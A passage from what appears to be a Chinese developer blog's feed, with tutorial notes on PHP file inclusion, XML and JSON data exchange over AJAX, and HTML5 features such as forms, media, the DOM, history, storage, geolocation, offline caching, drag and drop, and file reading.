title="文件导入&amp;&amp;常用php函数"></a>文件导入&amp;&amp;常用php函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include <span class="string">'07.form.html'</span>; <span class="comment">// 第一种方法</span></span><br><span class="line"><span class="built_in">require</span> <span class="string">'07.form.php'</span>; <span class="comment">// 第二种方法</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$array = array(</span><br><span class="line">    <span class="string">'username'</span>=&gt;<span class="string">'Hirkau'</span>,</span><br><span class="line">    <span class="string">'password'</span>=&gt;<span class="string">'123456'</span></span><br><span class="line">);</span><br><span class="line">echo <span class="string">'获取数组的长度：'</span>.count($array);</span><br><span class="line">echo <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">echo <span class="string">'判断是否在数组中：'</span>.in_array(<span class="string">'Hirkau'</span>,$array);</span><br><span class="line">echo <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">echo <span class="string">'检测数组中是否存在key：'</span>.array_key_exists(<span class="string">'username'</span>,$array);</span><br><span class="line">echo <span class="string">'&lt;br&gt;'</span>;</span><br></pre></td></tr></table></figure><h2 id="数据描述和例子"><a href="#数据描述和例子" class="headerlink" title="数据描述和例子"></a>数据描述和例子</h2><ul><li>必须有一个根元素</li><li>不可有空格、不可以数字或.开头、大小写敏感</li><li>不可交叉嵌套</li><li>属性双引号（浏览器自动修正成双引号了）</li><li>注释和HTML一样</li></ul><p>虽然可以描述和传输复杂数据，但是其解析过于复杂并且体积较大，所以实现开发已经很少使用了。</p><h3 id="xml-文件"><a href="#xml-文件" class="headerlink" title="xml 文件"></a>xml 文件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;arrayList&gt;</span><br><span class="line">        &lt;array&gt;</span><br><span class="line">            &lt;src&gt;images/banner.jpg&lt;<span class="regexp">/src&gt;</span></span><br><span class="line"><span class="regexp">            &lt;newPirce&gt;12.00&lt;/</span>newPirce&gt;</span><br><span class="line">            &lt;oldPrice&gt;<span class="number">30.00</span>&lt;<span class="regexp">/oldPrice&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>array&gt;</span><br><span class="line">        &lt;array&gt;</span><br><span class="line">            &lt;src&gt;images/banner.jpg&lt;<span class="regexp">/src&gt;</span></span><br><span class="line"><span class="regexp">            &lt;newPirce&gt;12.00&lt;/</span>newPirce&gt;</span><br><span class="line">            &lt;oldPrice&gt;<span class="number">30.00</span>&lt;<span class="regexp">/oldPrice&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>array&gt;</span><br><span class="line">    &lt;<span class="regexp">/arrayList&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>root&gt;</span><br></pre></td></tr></table></figure><h3 id="php-文件"><a href="#php-文件" class="headerlink" title="php 文件"></a>php 文件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    header(<span class="string">'Content-Type:text/xml;charset=utf-8'</span>);</span><br><span class="line">    <span class="comment">/*以xml格式传输数据的时候要求响应内容格式是   text/xml*/</span></span><br><span class="line">    <span class="comment">/*file_get_contents 获取文件内容*/</span></span><br><span class="line">    $xml = file_get_contents(<span class="string">'01.xml'</span>);</span><br><span class="line">    <span class="comment">/*输出xml内容*/</span></span><br><span class="line">    echo $xml;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="ajax-请求"><a href="#ajax-请求" class="headerlink" title="ajax 请求"></a>ajax 请求</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest;</span><br><span class="line">xhr.open(<span class="string">'get'</span>,<span class="string">'01.php'</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.status == <span class="number">200</span> &amp;&amp; xhr.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="comment">/*获取到XML格式内容  放回的是DOM对象  document*/</span></span><br><span class="line">        <span class="keyword">var</span> xml = xhr.responseXML;</span><br><span class="line">        <span class="comment">/*通过选着器可以获取到xml的数据*/</span></span><br><span class="line">        <span class="built_in">console</span>.log(xml.querySelectorAll(<span class="string">'array'</span>)[<span class="number">0</span>].querySelector(<span class="string">'src'</span>).innerHTML);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p>即JavaScript Object Notation，另一种轻量级的文本数据交换格式，独立于语言。</p><ul><li>数据在名称/值对中</li><li>数据由逗号分隔(最后一个健/值对不能带逗号)</li><li>花括号保存对象方括号保存数组</li><li>使用双引号</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;<span class="string">"src"</span>:<span class="string">"images/detail01.jpg"</span>,<span class="string">"oldPrice"</span>:<span class="string">"10.12"</span>,<span class="string">"newPrice"</span>:<span class="string">"130.00"</span>&#125;,</span><br><span class="line">  &#123;<span class="string">"src"</span>:<span class="string">"images/detail02.jpg"</span>,<span class="string">"oldPrice"</span>:<span class="string">"1.00"</span>,<span class="string">"newPrice"</span>:<span class="string">"11.00"</span>&#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><blockquote><p>JSON数据在不同语言进行传输时，类型为字符串，不同的语言各自也都对应有解析方法，需要解析完成后才能读取；</p></blockquote><p><strong>1、PHP解析方法</strong></p><p>json_encode()、json_decode()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    header(<span class="string">'Content-Type:text/html;charset=utf-8'</span>);</span><br><span class="line">    <span class="comment">/*以json格式传输数据的时候要求响应内容格式是 application/json*/</span></span><br><span class="line">    <span class="comment">/*注意也可以不设置  但是这遵循的一个规范*/</span></span><br><span class="line">    <span class="comment">/*file_get_contents 获取文件内容*/</span></span><br><span class="line">    $json = file_get_contents(<span class="string">'01.json'</span>);</span><br><span class="line">    <span class="comment">/*输出json内容*/</span></span><br><span class="line">    <span class="keyword">echo</span> $json;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;br&gt;'</span>;</span><br><span class="line">    $array = <span class="keyword">array</span>(</span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'src'</span>=&gt;<span class="string">'images/detail01.jpg'</span>,<span class="string">'newPrice'</span>=&gt;<span class="string">'12.00'</span>,<span class="string">'oldPrice'</span>=&gt;<span class="string">'455.00'</span>),</span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'src'</span>=&gt;<span class="string">'images/detail02.jpg'</span>,<span class="string">'newPrice'</span>=&gt;<span class="string">'65.00'</span>,<span class="string">'oldPrice'</span>=&gt;<span class="string">'878.00'</span>),</span><br><span class="line">        <span class="keyword">array</span>( <span class="string">'src'</span>=&gt;<span class="string">'images/detail01.jpg'</span>,<span class="string">'newPrice'</span>=&gt;<span class="string">'100.00'</span>,<span class="string">'oldPrice'</span>=&gt;<span class="string">'1000.00'</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">/*将php数组转化成json字符*/</span></span><br><span class="line">    $json_array = json_encode($array);</span><br><span class="line">    <span class="keyword">echo</span> $json_array;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;br&gt;'</span>;</span><br><span class="line">    <span class="comment">/*将json字符转化成php数组*/</span></span><br><span class="line">    $array_json = json_decode($json_array);</span><br><span class="line">    <span class="keyword">echo</span> $array_json;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;br&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2、Javascript 解析方法</strong></p><ul><li>JSON对象 JSON.parse()、JSON.stringify()；</li><li>JSON兼容处理json2.js</li><li>总结：JSON体积小、解析方便且高效，在实际开发成为首选。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest;</span><br><span class="line">xhr.open(<span class="string">'get'</span>,<span class="string">'01.php'</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(xhr.status == <span class="number">200</span> &amp;&amp; xhr.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">    <span class="comment">/*获取仅仅是字符串*/</span></span><br><span class="line">    <span class="keyword">var</span> text = xhr.responseText;</span><br><span class="line">    <span class="comment">/*需要把字符串转化成JSON对象*/</span></span><br><span class="line">    <span class="keyword">var</span> json_obj = <span class="built_in">JSON</span>.parse(text);</span><br><span class="line">    <span class="built_in">console</span>.log(json_obj);</span><br><span class="line">    <span class="comment">/*我们也可以把JSON对象转化成字符串*/</span></span><br><span class="line">    <span class="keyword">var</span> json_str = <span class="built_in">JSON</span>.stringify(json_obj);</span><br><span class="line">    <span class="built_in">console</span>.log(json_str);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;php基础&quot;&gt;&lt;a href=&quot;#php基础&quot; class=&quot;headerlink&quot; title=&quot;php基础&quot;&gt;&lt;/a&gt;php基础&lt;/h2&gt;&lt;p&gt;文件以.php后缀结尾，所有程序包含在 &lt;code&gt;&amp;lt;?php ** 这里是代码 ** ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;避免使用中文目录和中文文件名，php页面无法直接打开需要运行在服务器环境当中。&lt;/p&gt;
    
    </summary>
    
      <category term="PHP系列" scheme="http://yoursite.com/categories/PHP%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>HTML5知识体系</title>
    <link href="http://yoursite.com/2016/01/18/HTML5%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB/"/>
    <id>http://yoursite.com/2016/01/18/HTML5知识体系/</id>
    <published>2016-01-17T16:00:00.000Z</published>
    <updated>2018-06-04T02:19:34.695Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介、h5语义化标签、经典布局"><a href="#简介、h5语义化标签、经典布局" class="headerlink" title="简介、h5语义化标签、经典布局"></a>简介、h5语义化标签、经典布局</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--[<span class="keyword">if</span> lt IE <span class="number">9</span>]&gt;</span><br><span class="line">&lt;script src=<span class="string">"js/html5shiv.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;![endif]--&gt;</span><br></pre></td></tr></table></figure><ul><li>html骨架</li><li>经典网页布局</li><li>语义化标签 header、nav、main、session、article、aside、figure、footer、mark、progress、hgroup(已废弃)、time、details、bdi、command、summary、rp、rt、ruby</li><li>兼容h5标签的插件 html5shiv.min.js</li></ul><a id="more"></a><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><ul><li><p>表单类型</p><ul><li>text</li><li>password</li><li>radio</li><li>checkbox</li><li>button</li><li>submit</li><li>reset</li><li>image</li><li>file</li><li>hidden</li><li>email</li><li>color</li><li>url</li><li>number 、search、range 、tel、time、date、datetime、week、month、datetime-local</li></ul></li><li><p>表单元素</p></li><li><p>表单属性</p><ul><li>placeholder 占位符</li><li>autofocus 获取焦点</li><li>multiple 文件上传多选或多个邮箱地址</li><li>autocomplete 自动完成，用于form元素，也可用于部分input，默认值on</li><li>form 指定表单项属于哪个form，处理复杂表单时会需要</li><li>novalidate 关闭验证，可用于</li><li>标签，（只适应用form）</li><li>required 验证条件，必填项</li><li>pattern 正则表达式 自定义验证规则</li></ul></li><li><p>表单事件 inp.oninput，内容改变时触发</p></li></ul><h3 id="表单元素-注意-datalist-的使用"><a href="#表单元素-注意-datalist-的使用" class="headerlink" title="表单元素 注意 datalist 的使用"></a>表单元素 注意 <code>datalist</code> 的使用</h3><p>表单元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;datalist&gt;</span><br><span class="line">  &lt;input type=<span class="string">"text"</span> list=<span class="string">"hobby"</span> name=<span class="string">"hobby"</span>&gt;</span><br><span class="line">  &lt;datalist id=<span class="string">"hobby"</span>&gt;</span><br><span class="line">  &lt;option value=<span class="string">"basketball"</span>&gt;&lt;/option&gt;</span><br><span class="line">  &lt;option value=<span class="string">"basketball"</span>&gt;&lt;/option&gt;</span><br><span class="line">  &lt;option value=<span class="string">"football"</span>&gt;&lt;/option&gt;</span><br><span class="line">  &lt;option value=<span class="string">"pingpang"</span>&gt;&lt;/option&gt;</span><br><span class="line">&lt;<span class="regexp">/datalist&gt;</span></span><br><span class="line"><span class="regexp">&lt;keygen name="security"&gt;&lt;/</span>keygen&gt;加密类型</span><br></pre></td></tr></table></figure><h3 id="表单属性"><a href="#表单属性" class="headerlink" title="表单属性"></a>表单属性</h3><ul><li>autofocus</li><li>placeholder</li><li>multiple</li><li>autocomplete</li></ul><h2 id="媒体"><a href="#媒体" class="headerlink" title="媒体"></a>媒体</h2><h3 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h3><h4 id="三种媒体格式"><a href="#三种媒体格式" class="headerlink" title="三种媒体格式"></a>三种媒体格式</h4><ul><li>controls</li><li>autoplay 两个属性</li></ul><h4 id="三种媒体格式-1"><a href="#三种媒体格式-1" class="headerlink" title="三种媒体格式"></a>三种媒体格式</h4><ul><li>mp3</li><li>ogg</li><li>wav</li></ul><h3 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h3><h4 id="三种媒体格式-2"><a href="#三种媒体格式-2" class="headerlink" title="三种媒体格式"></a>三种媒体格式</h4><ul><li>controls</li><li>autoplay 两个属性</li></ul><h4 id="三种媒体格式-3"><a href="#三种媒体格式-3" class="headerlink" title="三种媒体格式"></a>三种媒体格式</h4><ul><li>mp4</li><li>ogg</li><li>webm</li></ul><h2 id="DOM扩展"><a href="#DOM扩展" class="headerlink" title="DOM扩展"></a>DOM扩展</h2><h3 id="获取元素"><a href="#获取元素" class="headerlink" title="获取元素"></a>获取元素</h3><ul><li><code>document.getElementsByClassName (&#39;class&#39;)</code><ul><li>通过类名获取元素，以类数组形式存在。</li></ul></li><li><code>document.querySelector(&#39;selector&#39;)</code><ul><li>通过CSS选择器获取元素，符合匹配条件的第1个元素。</li></ul></li><li><code>document.querySelectorAll(&#39;selector&#39;)</code><ul><li>通过CSS选择器获取元素，以类数组形式存在。</li></ul></li></ul><p>css当中可用的 在querySelector中都能用</p><h3 id="querySelector-querySelectorAll"><a href="#querySelector-querySelectorAll" class="headerlink" title="querySelector querySelectorAll"></a>querySelector querySelectorAll</h3><h3 id="类名操作-比较方便"><a href="#类名操作-比较方便" class="headerlink" title="类名操作(比较方便)"></a>类名操作(比较方便)</h3><ul><li><code>this.classList</code><ul><li>!当前元素的class!</li></ul></li><li><code>if(this.classList.contains(&#39;active&#39;)) return false;</code><ul><li>!如果已经有active 不做任何操作!</li></ul></li><li><code>this.classList.remove(&#39;active&#39;);</code><ul><li>!清除class!</li></ul></li><li><code>this.classList.add(&#39;active&#39;);</code><ul><li>!当没有选中的时候 添加class active!</li></ul></li><li><code>Node.classList.add(&#39;class&#39;)</code><ul><li>添加class</li></ul></li><li><code>Node.classList.remove(&#39;class&#39;)</code><ul><li>移除class</li></ul></li><li><code>Node.classList.toggle(&#39;class&#39;)</code><ul><li>切换class，有则移除，无则添加</li></ul></li><li><code>Node.classList.contains(&#39;class&#39;)</code><ul><li>检测是否存在class</li></ul></li></ul><p>Node指一个有效的DOM节点，是一个通称</p><h3 id="自定义属性"><a href="#自定义属性" class="headerlink" title="自定义属性"></a>自定义属性</h3><ul><li>在HTML5中我们可以自定义属性，其格式如下data-*=””；</li><li>如：data-info=”我是自定义属性”，通过Node.dataset[‘info’]可获取到自定义的属性值。</li><li>Node.dataset是以类数组形式存在的</li><li>当我们设置data-my-name=”itcast”，则需要以驼峰格式才能正确获取（Node.dataset[‘myName’]）</li></ul><h4 id="jQuery的自定义属性方法data"><a href="#jQuery的自定义属性方法data" class="headerlink" title="jQuery的自定义属性方法data();"></a>jQuery的自定义属性方法data();</h4><ul><li>操作内存</li><li>当没有设置过data的时候可以取到dom上的属性</li><li>当我们设置过data之后 取的就是内存的</li><li>user-name userName<ul><li>驼峰命名和普通的类名都可以取到值</li></ul></li></ul><h4 id="直接操作DOM"><a href="#直接操作DOM" class="headerlink" title="直接操作DOM;"></a>直接操作DOM;</h4><p><code>nav.dataset[&#39;userName&#39;] = &#39;xgc&#39;;</code></p><ul><li>必须是驼峰命名</li></ul><h2 id="全屏"><a href="#全屏" class="headerlink" title="全屏"></a>全屏</h2><ul><li><code>webkitRequestFullScreen()</code></li></ul><h2 id="视频播放器案例"><a href="#视频播放器案例" class="headerlink" title="视频播放器案例"></a>视频播放器案例</h2><blockquote><p>视频播放的方法、属性、事件</p></blockquote><h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><ul><li><code>history.go();</code><ul><li>正为前进，负为后退</li></ul></li><li><code>history.back();</code><ul><li>后退</li></ul></li><li><code>history.forward();</code><ul><li>前进</li></ul></li><li><code>history.pushState({key: &#39;itcast&#39;}, &#39;标题变没变&#39;, &#39;/test.html&#39;);</code><ul><li>pushState可以往历史记录添加一条记录</li></ul></li><li><code>history.replaceState(null, &#39;title&#39;, &#39;./test.html&#39;);</code><ul><li>替换历史记录</li></ul></li><li><code>window.onpopstate = function (state) {console.log(state);}</code><ul><li>监听历史的变化？只有在点后退前进时调用</li></ul></li></ul><h2 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h2><h3 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage;"></a>sessionStorage;</h3><ul><li><code>window.sessionStorage.setItem(key, val);</code><ul><li>存一个数据</li></ul></li><li><code>var val = window.sessionStorage.getItem(key);</code><ul><li>读取一个数据</li></ul></li><li><code>var val = window.sessionStorage.removeItem(key);</code><ul><li>删除一个数据</li></ul></li><li><code>window.sessionStorage.clear();</code><ul><li>清空一个数据</li></ul></li></ul><h3 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h3><ul><li><code>window.localStorage.setItem(key, val);</code><ul><li>存一个数据</li></ul></li><li><code>var val = window.localStorage.getItem(key);</code><ul><li>读取一个数据</li></ul></li><li><code>var val = window.localStorage.removeItem(key);</code><ul><li>删除一个数据</li></ul></li><li><code>window.localStorage.clear();</code><ul><li>清空一个数据</li></ul></li></ul><h2 id="geolocation"><a href="#geolocation" class="headerlink" title="geolocation"></a>geolocation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*引入百度地图*/</span></span><br><span class="line">&lt;script src=<span class="string">"http://api.map.baidu.com/api?v=2.0&amp;ak= 0A5bc3c4fb543c8f9bc54b77bc155724"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">/*如果存在这个属性就说明浏览器支持定位*/</span></span><br><span class="line">  <span class="keyword">if</span>(navigator.geolocation) &#123;</span><br><span class="line">    navigator.geolocation.getCurrentPosition(<span class="function"><span class="keyword">function</span> (<span class="params">position</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> latitude = position.coords.latitude; <span class="comment">// 纬度</span></span><br><span class="line">      <span class="keyword">var</span> longitude = position.coords.longitude; <span class="comment">// 经度</span></span><br><span class="line">      <span class="built_in">console</span>.log(position);</span><br><span class="line">      <span class="comment">/********************/</span></span><br><span class="line">      <span class="comment">// 这些都是写死</span></span><br><span class="line">      <span class="keyword">var</span> map = <span class="keyword">new</span> BMap.Map(<span class="string">"container"</span>); <span class="comment">// container表示主到哪个容器</span></span><br><span class="line">      <span class="comment">// 把经度纬度传给百度</span></span><br><span class="line">      <span class="keyword">var</span> point = <span class="keyword">new</span> BMap.Point(longitude, latitude);</span><br><span class="line">      map.centerAndZoom(point, <span class="number">15</span>);</span><br><span class="line">      <span class="comment">/****************************/</span></span><br><span class="line">      <span class="comment">// 只写上面三行就可出现地图了，并且会定位</span></span><br><span class="line">      <span class="comment">// 定义好了一个图片标记</span></span><br><span class="line">      <span class="keyword">var</span> myIcon = <span class="keyword">new</span> BMap.Icon(<span class="string">"http://developer.baidu.com/map/jsdemo/img/fox.gif"</span>, <span class="keyword">new</span> BMap.Size(<span class="number">300</span>, <span class="number">157</span>));</span><br><span class="line">      <span class="comment">// 创建标注</span></span><br><span class="line">      <span class="keyword">var</span> marker = <span class="keyword">new</span> BMap.Marker(point, &#123;<span class="attr">icon</span>: myIcon&#125;);</span><br><span class="line">      map.addOverlay(marker);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="缓存技术"><a href="#缓存技术" class="headerlink" title="缓存技术"></a>缓存技术</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CACHE MANIFEST</span><br><span class="line">CACHE:</span><br><span class="line">#此部分写需要缓存的资源 （#是注释的意思）</span><br><span class="line">./images/img1.jpg</span><br><span class="line">./images/img2.jpg</span><br><span class="line">./images/img3.jpg</span><br><span class="line">./images/img4.jpg</span><br><span class="line">./images/img5.jpg</span><br><span class="line">NETWORK: </span><br><span class="line">#此部分要写需要有网络才可访问的资源，无网络刚不访问</span><br><span class="line">./js/main.js</span><br><span class="line">*</span><br><span class="line">FALLBACK:</span><br><span class="line">#当访问不到某个资源的情况下，自动由另一个资源替换</span><br><span class="line">./css/online.css ./css/offline.css</span><br><span class="line">./online.html ./offline.html</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--是不是做离线缓存  缓冲清单--&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span> manifest=<span class="string">"./study.appcache"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;Application Cache&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;link rel="stylesheet" href="./</span>css/main.css<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;link rel="</span>stylesheet<span class="string">" href="</span>./css/online.css<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;img src="</span>./images/img1.jpg<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;img src="</span>./images/img2.jpg<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;img src="</span>./images/img3.jpg<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;img src="</span>./images/img4.jpg<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;img src="</span>./images/img5.jpg<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;script src="</span>./js/main.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><h2 id="拖拽"><a href="#拖拽" class="headerlink" title="拖拽"></a>拖拽</h2><h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><p><code>&lt;div class=&quot;box&quot; draggable=&quot;true&quot;&gt;&lt;/div&gt;</code></p><h3 id="拖拽元素"><a href="#拖拽元素" class="headerlink" title="拖拽元素"></a>拖拽元素</h3><ul><li>drag</li><li>dragleave</li><li>dragstart</li><li>dragend</li></ul><h3 id="目标元素"><a href="#目标元素" class="headerlink" title="目标元素"></a>目标元素</h3><ul><li>dragover 在目标元素上移动</li><li>drop</li><li>dragleave</li><li>e.preventDefault();<ul><li>阻止浏览器默认行为</li></ul></li></ul><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文件选择的一个事件file.onchange</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;input type=<span class="string">"file"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"file"</span> multiple&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">        <span class="comment">/*文件对象*/</span></span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.querySelector(<span class="string">'.file'</span>);</span><br><span class="line">        <span class="comment">/*文件选择的一个事件*/</span></span><br><span class="line">    file.onchange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">      reader.readAsDataURL(<span class="keyword">this</span>.files[<span class="number">0</span>]);</span><br><span class="line">      reader.onload = <span class="function"><span class="keyword">function</span> (<span class="params">ev</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.querySelector(<span class="string">'#img'</span>).src = <span class="keyword">this</span>.result;</span><br><span class="line">      